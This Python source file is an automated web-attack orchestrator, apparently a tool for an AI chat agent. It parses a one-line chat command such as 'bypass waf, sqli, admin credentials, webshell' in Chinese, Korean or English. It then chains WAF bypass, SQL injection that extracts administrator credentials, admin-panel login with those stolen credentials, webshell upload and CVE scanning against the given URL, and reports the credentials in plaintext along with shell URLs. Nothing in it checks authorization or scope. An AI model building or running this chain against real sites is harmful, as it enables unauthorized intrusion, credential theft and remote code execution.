"""
mission_orchestrator.py — 미션 자동 오케스트레이터 (v6.2.143)

사용법:
  채팅창에 단 한 줄만 입력하면 전체 공격 체인이 자동 실행된다.

  예시:
    https://target.com/ 绕过waf，sql渗透，管理员账号密码，webshell权限
    https://target.com/ WAF 우회, SQL 침투, 관리자 계정 탈취, 웹쉘
    https://target.com/ bypass waf, sqli, admin credentials, webshell

미션 타입 자동 감지:
  - RECON:       정찰 (기술 감지 + 정보 수집)
  - SQLI:        SQL 인젝션 → DB 접근 → 관리자 ID/PW 탈취
  - ADMIN_LOGIN: 관리자 패널 로그인 + 스크린샷
  - WEBSHELL:    웹쉘 업로드 + RCE
  - FULL_PENTEST: 전체 침투 (위 모두 + CVE + 보안 감사)
  - WAF_BYPASS:  WAF 우회 모드 활성화
  - XSS:         XSS 탐지 + PoC
  - SSRF:        SSRF 탐지
  - 100PCT:      Acunetix 100% 레벨 완전 스캔

자동 체인 순서 (FULL_PENTEST):
  1. 기술 스택 탐지 (tech_fingerprint)
  2. WAF 탐지 + 우회 설정
  3. 파라미터 자동 수집 (auto_crawl_params + param_fuzz)
  4. SQLi 자동 탐지 → 관리자 자격증명 추출 (sqli_autoexploit)
  5. 관리자 패널 로그인 시도 (admin_panel_login)
  6. 웹쉘 업로드 시도 (file_upload_scan)
  7. CVE 스캔 (cve_scan)
  8. 보안 감사 (security_full_audit)
  9. 취약점 종합 보고서
"""

from __future__ import annotations

import re
import time
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse, parse_qs

try:
    import requests as _requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning  # type: ignore
    _requests.packages.urllib3.disable_warnings(InsecureRequestWarning)  # type: ignore
    _HAS_REQUESTS = True
except ImportError:
    _HAS_REQUESTS = False

try:
    from bingo.lang.strings import get_text as _gt
    def _t(key: str, **kw) -> str:
        v = _gt(key) or key
        for k, val in kw.items():
            v = v.replace(f"{{{k}}}", str(val))
        return v
except Exception:
    def _t(key: str, **kw) -> str:  # type: ignore[misc]
        return key

_DEFAULT_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
               "AppleWebKit/537.36 (KHTML, like Gecko) "
               "Chrome/125.0 Safari/537.36")

def _banner(title: str) -> str:
    return f"\n{'═'*62}\n  {title}\n{'═'*62}"

# ══════════════════════════════════════════════════════════════════════════════
# ── 미션 키워드 분류기 ────────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

_MISSION_KEYWORDS: Dict[str, List[str]] = {
    "FULL_PENTEST": [
        # Chinese
        "全渗透", "全部", "全面", "完整渗透", "完整测试",
        "绕过waf.*sql", "sql.*webshell", "waf.*admin",
        "管理员.*webshell", "webshell.*管理员",
        # Korean
        "전체 침투", "전부", "완전 침투", "종합 침투",
        "waf.*sql.*관리자", "sql.*웹쉘",
        # English
        "full pentest", "full scan", "complete pentest", "all attacks",
    ],
    "WAF_BYPASS": [
        "绕过waf", "绕过", "WAF绕过", "bypass waf", "waf bypass",
        "waf 우회", "WAF 우회", "우회",
    ],
    "SQLI": [
        "sql渗透", "sql注入", "sql injection", "sqli",
        "sql 침투", "sql 인젝션", "sql 취약점",
        "管理员账号", "管理员密码", "账号密码",
        "관리자 계정", "관리자 ID", "관리자 비밀번호", "admin credentials",
    ],
    "ADMIN_LOGIN": [
        "管理员登录", "后台登录", "admin panel", "관리자 패널",
        "管理后台", "管理员界面", "admin login",
    ],
    "WEBSHELL": [
        "webshell权限", "webshell", "웹쉘", "web shell",
        "文件上传", "上传漏洞", "파일 업로드",
        "getshell", "get shell", "rce", "원격 실행",
    ],
    "XSS": [
        "xss", "跨站", "크로스사이트", "cross-site scripting",
        "脚本注入",
    ],
    "SSRF": [
        "ssrf", "服务器请求伪造", "内网探测",
        "ssrf 탐지", "내부망",
    ],
    "CVE": [
        "cve", "log4shell", "spring4shell", "shellshock",
        "취약점 스캔", "cve 스캔",
    ],
    "RECON": [
        "侦察", "信息收集", "指纹识别",
        "정찰", "정보 수집", "기술 스택",
        "recon", "fingerprint", "reconnaissance",
    ],
    "SECURITY_AUDIT": [
        "安全审计", "安全检查", "보안 감사", "보안 점수",
        "security audit", "security check", "headers",
    ],
    "100PCT": [
        "100%", "acunetix", "full_deep_scan", "완전 스캔",
    ],
}

def classify_mission(description: str) -> List[str]:
    """
    미션 설명에서 미션 타입 목록을 추출한다.
    복수의 미션 타입이 감지될 수 있다.

    Returns:
        list of mission types, ordered by execution priority
    """
    desc_lower = description.lower()
    detected = []

    # FULL_PENTEST 특수 패턴 (다중 목표 감지)
    mission_counts = 0
    for mtype, keywords in _MISSION_KEYWORDS.items():
        for kw in keywords:
            if re.search(kw.lower(), desc_lower):
                if mtype not in detected:
                    detected.append(mtype)
                    mission_counts += 1
                break

    # 3개 이상 미션 타입 → FULL_PENTEST로 통합
    if mission_counts >= 3 and "FULL_PENTEST" not in detected:
        detected.insert(0, "FULL_PENTEST")

    # 기본값: RECON
    if not detected:
        detected = ["RECON"]

    # 우선순위 정렬
    priority_order = [
        "FULL_PENTEST", "WAF_BYPASS", "SQLI", "ADMIN_LOGIN",
        "WEBSHELL", "XSS", "SSRF", "CVE", "SECURITY_AUDIT",
        "RECON", "100PCT",
    ]
    detected.sort(key=lambda x: priority_order.index(x) if x in priority_order else 99)

    return detected

# ══════════════════════════════════════════════════════════════════════════════
# ── 핵심 미션 오케스트레이터 ─────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

def mission_execute(
    url: str,
    mission: str = "",
    session_headers: Optional[Dict] = None,
    use_playwright: bool = True,
    verbose: bool = True,
) -> Dict[str, Any]:
    """
    미션 자동 오케스트레이터 — 단 하나의 명령으로 전체 공격 체인 실행.

    사용법:
      mission_execute(
          url="https://target.com/",
          mission="绕过waf，sql渗透，管理员账号密码，webshell权限"
      )
      또는
      mission_execute(
          url="https://target.com/",
          mission="WAF 우회, SQL 침투, 관리자 계정, 웹쉘"
      )

    미션 자동 감지 후 아래 순서로 실행:
      WAF_BYPASS → RECON → SQLI → ADMIN_LOGIN → WEBSHELL → CVE → SECURITY_AUDIT

    Args:
        url: 타겟 URL
        mission: 미션 설명 (한국어/중국어/영어 모두 지원)
        session_headers: 세션 헤더 (인증 쿠키 등)
        use_playwright: Playwright 사용 여부 (DOM XSS / JS 렌더링)
        verbose: 단계별 출력

    Returns:
        dict with all_findings, credentials, webshell_url, report
    """
    if not _HAS_REQUESTS:
        return {"success": False, "output": "requests 필요"}

    # 미션 분류
    missions = classify_mission(mission or "full pentest")
    is_full = "FULL_PENTEST" in missions

    if verbose:
        print(_banner(f"🎯 MISSION START — {url}"))
        print(f"  미션: {mission or '전체 침투 테스트'}")
        print(f"  감지된 목표: {', '.join(missions)}")
        print(f"  실행 체인: {'→'.join(missions[:6])}")
        if is_full:
            print("  🔴 FULL PENTEST 모드 활성화")

    # 결과 누적
    all_findings: List[Dict] = []
    extracted_creds: List[Dict] = []
    webshell_urls: List[str] = []
    admin_login_results: List[Dict] = []
    step_results: Dict[str, Any] = {}
    report_lines: List[str] = []

    def _safe_run(fn, label: str, *args, **kwargs) -> Dict:
        try:
            if verbose:
                print(f"\n  ▶ {label}...")
            result = fn(*args, **kwargs)
            if result.get("findings"):
                all_findings.extend(result["findings"])
            step_results[label] = result
            return result
        except Exception as e:
            if verbose:
                print(f"  ⚠️ {label} 오류: {e}")
            return {"findings": [], "success": False, "error": str(e)}

    # ── STEP 0: WAF 탐지 및 우회 설정 ────────────────────────────────────────
    if "WAF_BYPASS" in missions or is_full:
        print("\n" + "─"*50)
        print("  🛡️ [STEP 1/7] WAF 탐지 + 우회 설정")
        print("─"*50)
        try:
            from bingo.tools_ext.pentest_tools import TOOL_REGISTRY
            if "waf_detect" in TOOL_REGISTRY:
                waf_r = _safe_run(TOOL_REGISTRY["waf_detect"], "WAF 탐지", url=url)
                waf_type = waf_r.get("waf_type", "unknown")
                step_results["waf"] = waf_r
                print(f"  WAF: {waf_type}")
                report_lines.append(f"WAF: {waf_type}")
        except Exception:
            pass

    # ── STEP 1: 기술 스택 탐지 (정찰) ────────────────────────────────────────
    if "RECON" in missions or is_full:
        print("\n" + "─"*50)
        print("  🔬 [STEP 2/7] 기술 스택 정찰")
        print("─"*50)
        try:
            from bingo.tools_ext.builtin.advanced_scanners import tech_fingerprint
            tech_r = _safe_run(tech_fingerprint, "기술 스택 탐지", url=url, session_headers=session_headers)
            step_results["tech"] = tech_r
            techs = tech_r.get("technologies", [])
            cms = tech_r.get("cms")
            backend = tech_r.get("backend")
            db = tech_r.get("db")
            print(f"  기술 스택: {', '.join(techs[:5]) or '?'}")
            print(f"  CMS: {cms} | Backend: {backend} | DB: {db}")
            report_lines.append(f"기술: {', '.join(techs[:5])}")
        except Exception as e:
            print(f"  ⚠️ 기술 탐지 오류: {e}")

    # ── STEP 2: 파라미터 자동 수집 ────────────────────────────────────────────
    print("\n" + "─"*50)
    print("  🔍 [STEP 3/7] 파라미터 수집 + 퍼징")
    print("─"*50)
    found_params: List[Dict] = []
    target_urls: List[Dict] = []
    try:
        from bingo.tools_ext.builtin.vuln_scanner_plus import auto_crawl_params
        crawl_r = _safe_run(auto_crawl_params, "크롤링", url, depth=1, session_headers=session_headers)
        target_urls = crawl_r.get("targets", [])
        print(f"  크롤링 타겟: {len(target_urls)}개")
    except Exception:
        pass

    try:
        from bingo.tools_ext.builtin.advanced_scanners import param_fuzz
        fuzz_r = _safe_run(param_fuzz, "파라미터 퍼징", url, session_headers=session_headers, max_params=100)
        found_params = fuzz_r.get("found_params", [])
        print(f"  발견된 파라미터: {len(found_params)}개")
        if found_params:
            print(f"  파라미터 목록: {[p['param'] for p in found_params[:10]]}")
    except Exception:
        pass

    # ── STEP 3: SQLi 침투 → 관리자 자격증명 ──────────────────────────────────
    if "SQLI" in missions or is_full:
        print("\n" + "─"*50)
        print("  💉 [STEP 4/7] SQL 인젝션 → 관리자 계정 탈취")
        print("─"*50)
        try:
            from bingo.tools_ext.pentest_tools import TOOL_REGISTRY
            # URL 파라미터 + 크롤링 타겟 + 퍼징 파라미터 통합
            sqli_targets = []
            # URL 자체 파라미터
            qs = parse_qs(urlparse(url).query)
            if qs:
                for p in list(qs.keys())[:5]:
                    sqli_targets.append({"url": url, "param": p, "method": "GET"})
            # 크롤링 타겟
            for t in target_urls[:5]:
                for p in t.get("params", [])[:3]:
                    sqli_targets.append({"url": t["url"], "param": p, "method": t.get("method", "GET")})
            # 퍼징 발견 파라미터
            sqli_candidates = [p["param"] for p in found_params if p["param"].lower() in
                               {"id", "user_id", "uid", "page", "cat", "pid", "order", "sort",
                                "product_id", "item_id", "article_id", "post_id", "board_id"}]
            for p in sqli_candidates[:3]:
                sqli_targets.append({"url": url, "param": p, "method": "GET"})

            if not sqli_targets:
                # 기본 id 파라미터 시도
                sqli_targets = [{"url": url + ("?" if "?" not in url else "&") + "id=1",
                                  "param": "id", "method": "GET"}]

            print(f"  SQLi 테스트 타겟: {len(sqli_targets)}개")
            sqli_found = False

            for t in sqli_targets[:8]:
                if sqli_found:
                    break
                sqli_url = t["url"]
                sqli_param = t["param"]

                # sqli_autoexploit 우선 (관리자 계정까지 추출)
                if "sqli_autoexploit" in TOOL_REGISTRY:
                    sqli_r = _safe_run(
                        TOOL_REGISTRY["sqli_autoexploit"], f"SQLi 자동 익스플로잇 [{sqli_param}]",
                        url=sqli_url, param=sqli_param, method=t.get("method", "GET"),
                    )
                    if sqli_r.get("success") or sqli_r.get("oracle_confirmed"):
                        sqli_found = True
                        print(f"  🔴 SQLi 확인! URL={sqli_url} PARAM={sqli_param}")
                        # 추출된 자격증명 확인
                        creds = sqli_r.get("admin_credentials", sqli_r.get("credentials", []))
                        if creds:
                            extracted_creds.extend(creds if isinstance(creds, list) else [creds])
                            print(f"  🔴 관리자 계정 탈취: {creds}")
                            report_lines.append(f"SQLi 성공: {sqli_url} [{sqli_param}]")
                            report_lines.append(f"자격증명: {creds}")

            if not sqli_found:
                print("  ❌ SQLi 직접 취약점 없음 — 확장 스캔 시도...")
                from bingo.tools_ext.builtin.advanced_scanners import sqli_scan_plus
                for t in sqli_targets[:5]:
                    r = sqli_scan_plus(t["url"], t["param"], t.get("method", "GET"), session_headers=session_headers)
                    if r.get("success"):
                        sqli_found = True
                        print(f"  🟡 SQLi 취약점 감지 (수동 익스플로잇 필요): {t['param']}")
                        all_findings.extend(r.get("findings", []))
                        break

        except Exception as e:
            print(f"  ⚠️ SQLi 단계 오류: {e}")

    # ── STEP 4: 관리자 패널 로그인 ────────────────────────────────────────────
    if "ADMIN_LOGIN" in missions or "SQLI" in missions or is_full:
        print("\n" + "─"*50)
        print("  🔑 [STEP 5/7] 관리자 패널 로그인 시도")
        print("─"*50)
        try:
            from bingo.tools_ext.pentest_tools import TOOL_REGISTRY
            if "admin_panel_find" in TOOL_REGISTRY:
                panel_r = _safe_run(TOOL_REGISTRY["admin_panel_find"], "관리자 패널 탐색", url=url)
                admin_urls = panel_r.get("admin_urls", [])
                print(f"  관리자 패널 후보: {len(admin_urls)}개")

                if admin_urls and extracted_creds and "admin_panel_login" in TOOL_REGISTRY:
                    for cred in extracted_creds[:3]:
                        login_id = cred.get("username", cred.get("id", "admin"))
                        login_pw = cred.get("password", cred.get("pw", ""))
                        if login_pw:
                            for admin_url in admin_urls[:3]:
                                login_r = _safe_run(
                                    TOOL_REGISTRY["admin_panel_login"],
                                    f"로그인 [{login_id}]",
                                    url=admin_url, username=login_id, password=login_pw,
                                )
                                if login_r.get("success") or login_r.get("logged_in"):
                                    print(f"  🔴 [CRITICAL] 관리자 로그인 성공! {admin_url}")
                                    admin_login_results.append({
                                        "url": admin_url,
                                        "username": login_id,
                                        "password": login_pw,
                                        "screenshot": login_r.get("screenshot"),
                                    })
                                    report_lines.append(f"관리자 로그인 성공: {admin_url} ({login_id}:{login_pw})")
                                    break
                elif not extracted_creds:
                    print("  ⚠️ 자격증명 없음 — 기본 크레덴셜 시도")
                    from bingo.tools_ext.builtin.security_audit import COMMON_PASSWORDS_TRY  # type: ignore
        except Exception as e:
            print(f"  ⚠️ 관리자 로그인 단계 오류: {e}")

    # ── STEP 5: 웹쉘 업로드 ──────────────────────────────────────────────────
    if "WEBSHELL" in missions or is_full:
        print("\n" + "─"*50)
        print("  📤 [STEP 6/7] 웹쉘 업로드 시도")
        print("─"*50)
        try:
            from bingo.tools_ext.builtin.advanced_vuln_scanner import file_upload_scan
            webshell_r = _safe_run(file_upload_scan, "파일 업로드 취약점", url=url, session_headers=session_headers)
            for f in webshell_r.get("findings", []):
                if f.get("type") in ("webshell_rce", "file_upload_bypass"):
                    shell_url = f.get("shell_url", "")
                    if shell_url:
                        webshell_urls.append(shell_url)
                        print(f"  🔴 [CRITICAL] 웹쉘 URL: {shell_url}")
                        report_lines.append(f"웹쉘 업로드 성공: {shell_url}")

            # SQLi를 통한 웹쉘 (INTO OUTFILE)
            if not webshell_urls and extracted_creds:
                print("  🟡 SQLi INTO OUTFILE 웹쉘 시도 가능")
                report_lines.append("SQLi INTO OUTFILE 웹쉘 시도 가능 (수동 필요)")
        except Exception as e:
            print(f"  ⚠️ 웹쉘 단계 오류: {e}")

    # ── STEP 6: CVE + 보안 감사 (FULL 모드) ──────────────────────────────────
    if is_full or "CVE" in missions:
        print("\n" + "─"*50)
        print("  🔎 [STEP 7/7] CVE 스캔 + 보안 감사")
        print("─"*50)
        try:
            from bingo.tools_ext.builtin.advanced_scanners import cve_scan
            cve_r = _safe_run(cve_scan, "CVE 스캔", url=url, session_headers=session_headers)
            for f in cve_r.get("findings", []):
                print(f"  🔴 CVE: {f.get('cve')} — {f.get('note', '')}")
        except Exception:
            pass

        if "SECURITY_AUDIT" in missions or is_full:
            try:
                from bingo.tools_ext.builtin.security_audit import security_headers_check, source_exposure_scan
                # 보안 헤더 (빠른 버전)
                sh_r = _safe_run(security_headers_check, "보안 헤더", url=url, session_headers=session_headers)
                score = sh_r.get("score", "?")
                print(f"  보안 점수: {score}/100")
                # 소스 노출 (빠른)
                se_r = _safe_run(source_exposure_scan, "소스 파일 노출", url=url, session_headers=session_headers)
                for f in se_r.get("findings", [])[:5]:
                    if f["severity"] in ("CRITICAL", "HIGH"):
                        print(f"  🔴 소스 노출: {f['path']}")
            except Exception:
                pass

    # ── 최종 보고서 ───────────────────────────────────────────────────────────
    print(_banner("📊 미션 결과 보고서"))

    severity_map = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
    for f in all_findings:
        sev = f.get("severity", "LOW").upper()
        if sev in severity_map:
            severity_map[sev] += 1

    final_report = [
        f"🎯 타겟: {url}",
        f"🗓️ 미션: {mission or '전체 침투 테스트'}",
        "",
        f"📊 발견된 취약점: {len(all_findings)}개",
        f"   CRITICAL: {severity_map['CRITICAL']} | HIGH: {severity_map['HIGH']} | "
        f"MEDIUM: {severity_map['MEDIUM']} | LOW: {severity_map['LOW']}",
        "",
    ]

    if extracted_creds:
        final_report.append(f"🔴 관리자 자격증명 ({len(extracted_creds)}개):")
        for c in extracted_creds[:5]:
            final_report.append(f"   └ {c}")

    if admin_login_results:
        final_report.append(f"🔴 관리자 패널 로그인 ({len(admin_login_results)}개):")
        for a in admin_login_results:
            final_report.append(f"   └ {a['url']} — {a['username']}:{a['password']}")

    if webshell_urls:
        final_report.append(f"🔴 웹쉘 URL ({len(webshell_urls)}개):")
        for w in webshell_urls:
            final_report.append(f"   └ {w}?cmd=id")

    if report_lines:
        final_report.append("")
        final_report.append("📋 단계별 결과:")
        for line in report_lines:
            final_report.append(f"   ✅ {line}")

    final_report_str = "\n".join(final_report)
    print(final_report_str)

    return {
        "success": True,
        "url": url,
        "mission": mission,
        "missions_detected": missions,
        "all_findings": all_findings,
        "severity": severity_map,
        "extracted_creds": extracted_creds,
        "admin_login_results": admin_login_results,
        "webshell_urls": webshell_urls,
        "step_results": {k: v.get("output", "")[:200] for k, v in step_results.items()},
        "output": final_report_str,
    }

# ══════════════════════════════════════════════════════════════════════════════
# ── 채팅 입력 자동 파싱 ───────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

_URL_PATTERN = re.compile(
    r'https?://[^\s，,、\u3002\uff0c\uff1b;]+',
    re.IGNORECASE
)

def parse_mission_input(chat_input: str) -> Optional[Tuple[str, str]]:
    """
    채팅 입력에서 URL과 미션 설명을 자동 파싱한다.

    예시:
      "https://target.com/ 绕过waf，sql渗透，管理员账号密码，webshell权限"
      → ("https://target.com/", "绕过waf，sql渗透，管理员账号密码，webshell权限")

    Returns:
        (url, mission_description) or None
    """
    url_match = _URL_PATTERN.search(chat_input)
    if not url_match:
        return None

    url = url_match.group(0).rstrip("/") + "/"
    # URL 이후 텍스트를 미션으로
    after_url = chat_input[url_match.end():].strip()
    # URL 이전 텍스트도 포함
    before_url = chat_input[:url_match.start()].strip()
    mission = (before_url + " " + after_url).strip()

    # 미션 키워드가 있는지 확인
    has_mission_keywords = any(
        re.search(kw, mission.lower())
        for keywords in _MISSION_KEYWORDS.values()
        for kw in keywords
    )

    if has_mission_keywords or len(mission) > 3:
        return (url, mission)
    return (url, "full pentest")  # 기본값


MISSION_ORCHESTRATOR_TOOLS: Dict[str, Any] = {
    "mission_execute": mission_execute,
}
